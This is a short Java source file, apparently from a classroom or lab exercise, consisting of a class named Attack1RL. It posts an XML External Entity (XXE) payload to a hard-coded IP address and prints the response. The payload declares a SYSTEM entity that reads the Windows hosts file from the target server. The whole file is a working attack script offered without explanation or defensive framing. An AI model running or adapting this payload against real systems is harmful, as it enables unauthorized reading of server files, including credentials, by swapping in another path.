package post;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.impl.client.HttpClients;
import org.apache.http.message.BasicNameValuePair;

public class Attack1RL {
	public String At() throws ClientProtocolException, IOException {
		String resultado = "";
		CloseableHttpClient client = HttpClients.createDefault();
	    HttpPost httpPost = new HttpPost("http://35.161.4.173:8080/tst2/rs/clase2/metodopost");
	    String At="<!DOCTYPE root [ <!ELEMENT root ANY > <!ENTITY windowsfile SYSTEM "+'"'+"file:///C:/Windows/System32/drivers/etc/hosts"+'"'+"> ]><root> <info>  <boot>&windowsfile;</boot> </info></root>";
	    List<NameValuePair> params = new ArrayList<NameValuePair>();
	    params.add(new BasicNameValuePair("version", "xml"));
	    params.add(new BasicNameValuePair("Data", At));
	    httpPost.setEntity(new UrlEncodedFormEntity(params));
	    CloseableHttpResponse response = client.execute(httpPost);
		BufferedReader rd = new BufferedReader(new InputStreamReader(response.getEntity().getContent()));
		String line = "";
		while ((line = rd.readLine()) != null) {
			System.out.println(line);
			resultado=resultado+line;
        }
        return resultado;
	}
}	
